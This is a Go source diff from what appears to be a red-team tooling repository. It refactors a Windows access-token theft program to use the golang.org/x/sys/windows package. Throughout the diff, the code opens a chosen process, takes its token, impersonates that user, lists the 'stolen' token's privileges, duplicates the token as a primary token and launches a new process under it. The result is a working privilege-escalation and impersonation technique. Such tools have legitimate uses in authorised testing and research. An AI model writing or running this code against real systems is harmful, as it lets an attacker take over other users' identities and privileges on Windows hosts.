@@ -6,13 +6,13 @@ import (
 	// Standard
 	"flag"
 	"fmt"
+	"golang.org/x/sys/windows"
 	"io/ioutil"
 	"log"
 	"os"
 
 	// Oddments Internal
 	"github.com/Ne0nd0g/oddments/pkg/privs"
-	"github.com/Ne0nd0g/oddments/pkg/process"
 	"github.com/Ne0nd0g/oddments/pkg/tokens"
 	"github.com/Ne0nd0g/oddments/windows/advapi32"
 	"github.com/Ne0nd0g/oddments/windows/kernel32"
@@ -53,7 +53,7 @@ func main() {
 	if debug {
 		fmt.Println("[DEBUG] Retrieving Primary and Impersonation token information...")
 	}
-	whoami, err := tokens.WhoamiN()
+	whoami, err := tokens.WhoamiG()
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -65,8 +65,8 @@ func main() {
 	if debug {
 		fmt.Println("[DEBUG] Calling OpenProcess...")
 	}
-	var PROCESS_QUERY_INFORMATION uint32 = 0x0400
-	handle, err := kernel32.OpenProcessN(uint32(*pid), PROCESS_QUERY_INFORMATION, true)
+
+	handle, err := kernel32.OpenProcessG(uint32(*pid), windows.PROCESS_QUERY_INFORMATION, true)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -79,7 +79,7 @@ func main() {
 		if debug {
 			fmt.Println("[DEBUG] Calling CloseHandle on the process handle...")
 		}
-		err = kernel32.CloseHandleN(handle)
+		err = windows.CloseHandle(handle)
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -93,12 +93,9 @@ func main() {
 		fmt.Println("[DEBUG] Calling OpenProcessToken...")
 	}
 	// These token privs are required to call CreateProcessWithToken later
-	TOKEN_ASSIGN_PRIMARY := 0x0001
-	TOKEN_DUPLICATE := 0x0002
-	TOKEN_QUERY := 0x0008
-	DesiredAccess := TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY
-
-	token, err := advapi32.OpenProcessTokenN(handle, DesiredAccess)
+	DesiredAccess := windows.TOKEN_DUPLICATE | windows.TOKEN_ASSIGN_PRIMARY | windows.TOKEN_QUERY
+	var token windows.Token
+	err = windows.OpenProcessToken(handle, uint32(DesiredAccess), &token)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -111,7 +108,7 @@ func main() {
 		if debug {
 			fmt.Println("[DEBUG] Calling CloseHandle on the token handle...")
 		}
-		err = kernel32.CloseHandleN(token)
+		err = token.Close()
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -125,7 +122,7 @@ func main() {
 		if debug {
 			fmt.Println("[DEBUG] Calling tokens.ImpersonateLoggedOnUserN...")
 		}
-		err = advapi32.ImpersonateLoggedOnUserN(token)
+		err = advapi32.ImpersonateLoggedOnUserG(token)
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -166,7 +163,7 @@ func main() {
 		// List stolen access token privileges
 		if debug {
 			fmt.Println("[DEBUG] Getting the current (calling) process access token privileges...")
-			parentPrivs, err := privs.GetPrivileges(process.GetCurrentProcessTokenN())
+			parentPrivs, err := privs.GetPrivilegesG(windows.GetCurrentProcessToken())
 			if err != nil {
 				fmt.Printf("[!] %s\n", err)
 			}
@@ -176,7 +173,7 @@ func main() {
 			}
 
 			fmt.Println("[DEBUG] Getting stolen access token privileges...")
-			privileges, err := privs.GetPrivileges(token)
+			privileges, err := privs.GetPrivilegesG(token)
 			if err != nil {
 				fmt.Printf("[!] %s\n", err)
 			}
@@ -190,7 +187,7 @@ func main() {
 		if debug {
 			fmt.Println("[DEBUG] Calling tokens.RevertTotSelfN()...")
 		}
-		err = advapi32.RevertToSelfN()
+		err = windows.RevertToSelf()
 		if err != nil {
 			fmt.Printf("[!] %s\n", err)
 		}
@@ -205,10 +202,9 @@ func main() {
 		if debug {
 			fmt.Println("[DEBUG] Calling tokens.DuplicateTokenN...")
 		}
-		var MAXIMUM_ALLOWED uint32 = 0x02000000
-		var SecurityImpersonation uint32 = 0x2
-		var TokenPrimary uint32 = 0x1
-		dupToken, err := advapi32.DuplicateTokenN(token, MAXIMUM_ALLOWED, SecurityImpersonation, TokenPrimary)
+
+		var dupToken windows.Token
+		err = windows.DuplicateTokenEx(token, windows.MAXIMUM_ALLOWED, &windows.SecurityAttributes{}, windows.SecurityImpersonation, windows.TokenPrimary, &dupToken)
 		if err != nil {
 			log.Fatal(err)
 		}
@@ -218,9 +214,9 @@ func main() {
 
 		// Create a process with the token
 		if debug {
-			fmt.Println("[DEBUG] Calling tokens.CreateProcessWithTokenN...")
+			fmt.Println("[DEBUG] Calling tokens.CreateProcessWithTokenG...")
 		}
-		err = tokens.CreateProcessWithTokenN(dupToken, *proc, *args)
+		err = tokens.CreateProcessWithTokenG(dupToken, *proc, *args)
 		if err != nil {
 			log.Fatal(err)
 		}
